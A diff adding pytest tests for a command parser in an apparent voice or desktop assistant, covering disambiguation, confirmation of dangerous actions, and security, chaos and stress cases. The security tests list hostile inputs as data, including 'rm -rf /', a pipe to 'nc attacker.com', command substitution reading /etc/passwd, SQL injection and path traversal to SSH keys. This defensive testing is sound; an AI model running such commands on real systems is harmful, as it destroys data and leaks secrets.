@@ -634,3 +634,424 @@ class TestCommandParser:
         for cmd in commands * 10:  # 50 interpretations
             result = parser.interpret(cmd)
             assert result.is_command
+
+    # ========================================================================
+    # REQUIREMENT 6.5: CONVERSATION CONTEXT DISAMBIGUATION
+    # ========================================================================
+    
+    def test_context_disambiguation_pronouns(self, parser: CommandParser):
+        """Test disambiguation using conversation context with pronouns."""
+        # First command establishes context
+        result1 = parser.interpret("open chrome")
+        assert result1.is_command
+        
+        # Second command uses pronoun - should resolve to chrome
+        # Note: This requires context manager integration
+        result2 = parser.interpret("close it")
+        # Without context manager, this will just be a generic close command
+        assert result2.is_command
+    
+    def test_context_disambiguation_references(self, parser: CommandParser):
+        """Test disambiguation using references to previous commands."""
+        result1 = parser.interpret("search for python tutorial")
+        assert result1.is_command
+        
+        # Reference to previous search
+        result2 = parser.interpret("open the first result")
+        # Should recognize this as a command even without full context
+        if result2.is_command:
+            assert result2.confidence > 0.0
+    
+    # ========================================================================
+    # REQUIREMENT 6.6: MULTIPLE INTENT RANKING
+    # ========================================================================
+    
+    def test_multiple_intent_ranking(self, parser: CommandParser):
+        """Test ranking of multiple possible intents."""
+        # Ambiguous command that could match multiple patterns
+        result = parser.interpret("open")
+        
+        # Should either:
+        # 1. Not match (low confidence)
+        # 2. Match with lower confidence than exact match
+        if result.is_command:
+            assert result.confidence < 0.8  # Lower than exact match
+    
+    def test_intent_confidence_ordering(self, parser: CommandParser):
+        """Test that more specific commands have higher confidence."""
+        result1 = parser.interpret("open chrome")
+        result2 = parser.interpret("maybe open chrome if possible")
+        
+        assert result1.is_command
+        if result2.is_command:
+            # Exact command should have higher confidence
+            assert result1.confidence > result2.confidence
+    
+    # ========================================================================
+    # REQUIREMENT 6.7: STRUCTURED ERROR WITH SUGGESTIONS
+    # ========================================================================
+    
+    def test_structured_error_for_unparseable_command(self, parser: CommandParser):
+        """Test structured error response for unparseable commands."""
+        result = parser.interpret("xyzabc123 invalid nonsense")
+        
+        # Should not be recognized as command
+        assert not result.is_command
+        assert result.confidence == 0.0
+        
+        # Raw text should be preserved for error handling
+        assert result.raw_text is not None
+    
+    def test_error_with_close_match_suggestion(self, parser: CommandParser):
+        """Test that close matches can be identified."""
+        # Misspelled command
+        result = parser.interpret("opne chrome")  # "opne" instead of "open"
+        
+        # May or may not match depending on fuzzy matching
+        # But should have low confidence if it does match
+        if result.is_command:
+            assert result.confidence < 0.7
+    
+    # ========================================================================
+    # REQUIREMENT 17.2: COMMUNICATION COMMANDS (ENHANCED)
+    # ========================================================================
+    
+    def test_make_call_command(self, parser: CommandParser):
+        """Test making phone call command."""
+        # Register call command
+        parser.register_command(
+            patterns=[
+                r"call (?P<contact>[\w\s]+)",
+                r"phone (?P<contact>[\w\s]+)",
+                r"dial (?P<number>[\d\-\+\s]+)"
+            ],
+            action_id="MAKE_CALL",
+            description="Make a phone call",
+            parameters=["contact", "number"]
+        )
+        
+        result = parser.interpret("call john smith")
+        assert result.is_command
+        assert result.action_id == "MAKE_CALL"
+        assert "contact" in result.parameters
+    
+    def test_read_email_command_enhanced(self, parser: CommandParser):
+        """Test reading email with filters."""
+        result = parser.interpret("read email")
+        assert result.is_command
+        assert result.action_id == "READ_ITEM"
+        assert result.parameters["item"] == "email"
+    
+    # ========================================================================
+    # REQUIREMENT 17.5: CLARIFICATION FOR AMBIGUOUS COMMANDS
+    # ========================================================================
+    
+    def test_ambiguous_command_detection(self, parser: CommandParser):
+        """Test detection of ambiguous commands."""
+        # Command without required parameters
+        result = parser.interpret("send message")
+        
+        # Should either not match or have low confidence
+        if result.is_command:
+            # Missing recipient and message content
+            assert result.confidence < 0.8
+    
+    def test_incomplete_command_detection(self, parser: CommandParser):
+        """Test detection of incomplete commands."""
+        result = parser.interpret("set volume to")
+        
+        # Missing the volume level
+        if result.is_command:
+            assert result.confidence < 0.8
+    
+    # ========================================================================
+    # REQUIREMENT 17.9: CONFIRMATION REQUIRED COMMANDS
+    # ========================================================================
+    
+    def test_dangerous_command_requires_confirmation(self, parser: CommandParser):
+        """Test that dangerous commands are marked for confirmation."""
+        # Register dangerous command
+        parser.register_command(
+            patterns=[r"format drive (?P<drive>[A-Z]:)"],
+            action_id="FORMAT_DRIVE",
+            description="Format a drive",
+            parameters=["drive"],
+            requires_confirmation=True
+        )
+        
+        commands = parser.get_registered_commands()
+        format_cmd = next(cmd for cmd in commands if cmd["action_id"] == "FORMAT_DRIVE")
+        assert format_cmd["requires_confirmation"] is True
+    
+    def test_all_delete_commands_require_confirmation(self, parser: CommandParser):
+        """Test that all delete operations require confirmation."""
+        commands = parser.get_registered_commands()
+        delete_commands = [cmd for cmd in commands if "delete" in cmd["action_id"].lower()]
+        
+        for cmd in delete_commands:
+            assert cmd["requires_confirmation"] is True, \
+                f"Delete command {cmd['action_id']} should require confirmation"
+    
+    # ========================================================================
+    # SECURITY TESTS - ZERO COMPROMISE
+    # ========================================================================
+    
+    def test_command_injection_prevention(self, parser: CommandParser):
+        """Test that command injection attempts are parsed safely."""
+        malicious_inputs = [
+            "open chrome; rm -rf /",
+            "type hello && shutdown -h now",
+            "search for $(whoami)",
+            "open `cat /etc/passwd`",
+            "type hello | nc attacker.com 1234",
+        ]
+        
+        for malicious in malicious_inputs:
+            result = parser.interpret(malicious)
+            # Parser should extract parameters as-is
+            # EXECUTION layer is responsible for sanitization
+            # Test just ensures parser doesn't crash
+            assert result is not None
+            assert 0.0 <= result.confidence <= 1.0
+    
+    def test_sql_injection_prevention(self, parser: CommandParser):
+        """Test prevention of SQL injection attempts."""
+        sql_injections = [
+            "search for ' OR '1'='1",
+            "open app'; DROP TABLE users; --",
+            "type 1' UNION SELECT * FROM passwords--",
+        ]
+        
+        for sql_inj in sql_injections:
+            result = parser.interpret(sql_inj)
+            # Should parse safely without executing SQL
+            if result.is_command:
+                # Parameters should be treated as literal strings
+                assert result.confidence > 0.0
+    
+    def test_path_traversal_prevention(self, parser: CommandParser):
+        """Test prevention of path traversal attacks."""
+        path_traversals = [
+            "open file ../../etc/passwd",
+            "delete file ../../../windows/system32/config",
+            "create file ../../../../root/.ssh/authorized_keys",
+        ]
+        
+        for path_trav in path_traversals:
+            result = parser.interpret(path_trav)
+            # Should parse but parameters should be validated by execution layer
+            if result.is_command:
+                assert result.confidence > 0.0
+    
+    def test_buffer_overflow_prevention(self, parser: CommandParser):
+        """Test handling of extremely long inputs."""
+        # 10MB of text
+        huge_input = "type " + "A" * (10 * 1024 * 1024)
+        
+        try:
+            result = parser.interpret(huge_input)
+            # Should handle gracefully without crashing
+            assert result is not None
+        except MemoryError:
+            # Acceptable to raise MemoryError for huge inputs
+            pass
+    
+    def test_null_byte_injection(self, parser: CommandParser):
+        """Test handling of null bytes in input."""
+        null_byte_inputs = [
+            "open chrome\x00malicious",
+            "type hello\x00world",
+            "search for test\x00\x00\x00",
+        ]
+        
+        for null_input in null_byte_inputs:
+            result = parser.interpret(null_input)
+            # Should handle gracefully
+            assert result is not None
+    
+    def test_unicode_normalization_attacks(self, parser: CommandParser):
+        """Test handling of unicode normalization attacks."""
+        unicode_attacks = [
+            "open chromeⅠⅠⅠ",  # Roman numerals that look like III
+            "type ℀℁℃",  # Special unicode characters
+            "search for 𝕙𝕖𝕝𝕝𝕠",  # Mathematical bold text
+        ]
+        
+        for unicode_attack in unicode_attacks:
+            result = parser.interpret(unicode_attack)
+            # Should handle unicode gracefully
+            assert result is not None
+    
+    # ========================================================================
+    # CHAOS TESTS - ZERO COMPROMISE
+    # ========================================================================
+    
+    def test_random_bytes_handling(self, parser: CommandParser):
+        """Test handling of random byte sequences."""
+        import random
+        
+        for _ in range(10):
+            random_bytes = bytes([random.randint(0, 255) for _ in range(100)])
+            try:
+                random_text = random_bytes.decode('utf-8', errors='ignore')
+                result = parser.interpret(random_text)
+                assert result is not None
+            except Exception as e:
+                # Should not crash with unhandled exceptions
+                assert False, f"Crashed on random bytes: {e}"
+    
+    def test_corrupted_input_handling(self, parser: CommandParser):
+        """Test handling of corrupted/malformed input."""
+        corrupted_inputs = [
+            "",
+            " ",
+            "\n\n\n",
+            "\t\t\t",
+            "   \n   \t   ",
+            "\x00\x01\x02",
+            "�" * 100,  # Replacement characters
+        ]
+        
+        for corrupted in corrupted_inputs:
+            result = parser.interpret(corrupted)
+            assert result is not None
+            assert 0.0 <= result.confidence <= 1.0
+    
+    def test_mixed_encoding_handling(self, parser: CommandParser):
+        """Test handling of mixed character encodings."""
+        mixed_encodings = [
+            "open chrome café",  # Latin-1
+            "type hello мир",  # Cyrillic
+            "search for 你好世界",  # Chinese
+            "open app مرحبا",  # Arabic
+            "type שלום",  # Hebrew
+        ]
+        
+        for mixed in mixed_encodings:
+            result = parser.interpret(mixed)
+            assert result is not None
+    
+    # ========================================================================
+    # STRESS TESTS - ZERO COMPROMISE
+    # ========================================================================
+    
+    def test_massive_command_registration(self, parser: CommandParser):
+        """Test handling of massive number of registered commands."""
+        # Register 10,000 commands
+        for i in range(10000):
+            parser.register_command(
+                patterns=[f"command{i}"],
+                action_id=f"CMD_{i}",
+                description=f"Command {i}"
+            )
+        
+        # Should still work efficiently
+        result = parser.interpret("open chrome")
+        assert result.is_command
+        assert result.action_id == "OPEN_APP"
+    
+    def test_rapid_fire_interpretation(self, parser: CommandParser):
+        """Test rapid interpretation of many commands."""
+        commands = [
+            "open chrome",
+            "close firefox",
+            "type hello",
+            "click",
+            "scroll up",
+        ] * 1000  # 5000 interpretations
+        
+        for cmd in commands:
+            result = parser.interpret(cmd)
+            assert result is not None
+            assert 0.0 <= result.confidence <= 1.0
+    
+    def test_memory_leak_detection(self, parser: CommandParser):
+        """Test for memory leaks during repeated interpretation."""
+        import gc
+        import sys
+        
+        # Get initial memory usage
+        gc.collect()
+        initial_objects = len(gc.get_objects())
+        
+        # Interpret 1000 commands
+        for _ in range(1000):
+            result = parser.interpret("open chrome and close firefox then type hello")
+            del result
+        
+        # Force garbage collection
+        gc.collect()
+        final_objects = len(gc.get_objects())
+        
+        # Object count should not grow significantly
+        # Allow 10% growth for caching and internal structures
+        assert final_objects < initial_objects * 1.1, \
+            f"Potential memory leak: {initial_objects} -> {final_objects} objects"
+    
+    # ========================================================================
+    # EDGE CASES - ZERO COMPROMISE
+    # ========================================================================
+    
+    def test_extremely_nested_command_chain(self, parser: CommandParser):
+        """Test handling of extremely long command chains."""
+        # 100 chained commands
+        chain = " and ".join(["open chrome"] * 100)
+        result = parser.interpret(chain)
+        
+        assert result.is_command
+        assert result.action_id == "CHAINED_COMMAND"
+    
+    def test_command_with_all_special_characters(self, parser: CommandParser):
+        """Test command with every special character."""
+        special_chars = "!@#$%^&*()_+-=[]{}|;':\",./<>?`~"
+        result = parser.interpret(f"type {special_chars}")
+        
+        assert result.is_command
+        assert result.action_id == "TYPE_TEXT"
+    
+    def test_command_with_emoji(self, parser: CommandParser):
+        """Test command with emoji characters."""
+        emoji_text = "type hello 😀😃😄😁🎉🎊🎈"
+        result = parser.interpret(emoji_text)
+        
+        assert result.is_command
+        assert result.action_id == "TYPE_TEXT"
+    
+    def test_command_with_rtl_text(self, parser: CommandParser):
+        """Test command with right-to-left text."""
+        rtl_text = "type مرحبا بك في العالم"
+        result = parser.interpret(rtl_text)
+        
+        assert result.is_command
+        assert result.action_id == "TYPE_TEXT"
+    
+    def test_command_with_zero_width_characters(self, parser: CommandParser):
+        """Test command with zero-width characters."""
+        # Zero-width space, zero-width joiner, etc.
+        zwc_text = "open\u200Bchrome\u200C\u200D"
+        result = parser.interpret(zwc_text)
+        
+        # Should handle gracefully
+        assert result is not None
+    
+    def test_command_with_combining_characters(self, parser: CommandParser):
+        """Test command with combining diacritical marks."""
+        combining_text = "type café"  # e with combining acute accent
+        result = parser.interpret(combining_text)
+        
+        assert result.is_command
+        assert result.action_id == "TYPE_TEXT"
+    
+    def test_parameter_extraction_with_quotes(self, parser: CommandParser):
+        """Test parameter extraction with quoted strings."""
+        result = parser.interpret('type "hello world"')
+        
+        assert result.is_command
+        assert result.action_id == "TYPE_TEXT"
+    
+    def test_parameter_extraction_with_escaped_characters(self, parser: CommandParser):
+        """Test parameter extraction with escaped characters."""
+        result = parser.interpret(r"type hello\nworld\ttab")
+        
+        assert result.is_command
+        assert result.action_id == "TYPE_TEXT"
